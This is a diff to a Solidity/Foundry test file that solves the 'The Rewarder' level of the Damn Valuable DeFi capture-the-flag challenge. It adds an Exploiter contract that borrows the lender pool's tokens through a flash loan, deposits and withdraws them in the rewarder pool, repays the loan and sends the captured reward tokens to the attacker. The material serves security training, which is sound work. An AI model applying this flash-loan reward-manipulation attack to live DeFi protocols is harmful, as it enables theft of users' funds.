@@ -85,13 +85,15 @@ contract TheRewarder is Test {
     }
 
     function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
-
-        /**
-         * EXPLOIT END *
-         */
+        vm.warp(block.timestamp + 5 days); // 5 days
+        vm.startPrank(attacker);
+        Exploiter exploiter = new Exploiter(
+            flashLoanerPool,
+            theRewarderPool,
+            dvt
+        );
+        exploiter.exploit(TOKENS_IN_LENDER_POOL);
+        vm.stopPrank();
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
@@ -116,5 +118,37 @@ contract TheRewarder is Test {
 
         // Attacker finishes with zero DVT tokens in balance
         assertEq(dvt.balanceOf(attacker), 0);
+    }
+}
+
+contract Exploiter {
+    FlashLoanerPool internal immutable flashLoanerPool;
+    TheRewarderPool internal immutable theRewarderPool;
+    DamnValuableToken internal immutable dvt;
+    address private immutable owner;
+
+    constructor(FlashLoanerPool _flashLoanerPool, TheRewarderPool _theRewarderPool, DamnValuableToken _dvt) {
+        theRewarderPool = _theRewarderPool;
+        flashLoanerPool = _flashLoanerPool;
+        dvt = _dvt;
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only owner"); // Modifier to avoid front-running by searchers
+        _;
+    }
+
+    function exploit(uint256 _poolBalance) external onlyOwner {
+        // Borrow TOKENS_IN_LENDER_POOL from FlashLoanerPool
+        flashLoanerPool.flashLoan(_poolBalance);
+    }
+
+    function receiveFlashLoan(uint256 borrowed) external {
+        dvt.approve(address(theRewarderPool), borrowed);
+        theRewarderPool.deposit(borrowed);
+        theRewarderPool.withdraw(borrowed);
+        dvt.transfer(address(flashLoanerPool), borrowed);
+        theRewarderPool.rewardToken().transfer(owner, theRewarderPool.rewardToken().balanceOf(address(this)));
     }
 }
